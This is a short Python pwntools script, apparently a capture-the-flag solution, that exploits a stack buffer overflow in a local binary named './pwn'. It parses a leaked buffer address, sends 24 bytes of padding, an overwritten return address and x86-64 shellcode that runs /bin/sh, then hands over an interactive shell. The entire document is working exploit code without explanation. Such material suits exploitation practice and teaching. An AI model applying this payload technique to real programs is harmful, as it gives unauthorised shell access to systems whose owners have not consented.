from pwn import *
p = process("./pwn")
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
p.recvuntil(b"[")
addr = p.recvuntil(b"]",drop=True)
buf_addr = int(addr,16)
ret_addr = buf_addr + 32
payload = b"a"*24 + p64(ret_addr) + shellcode
p.sendline(payload)
p.interactive()
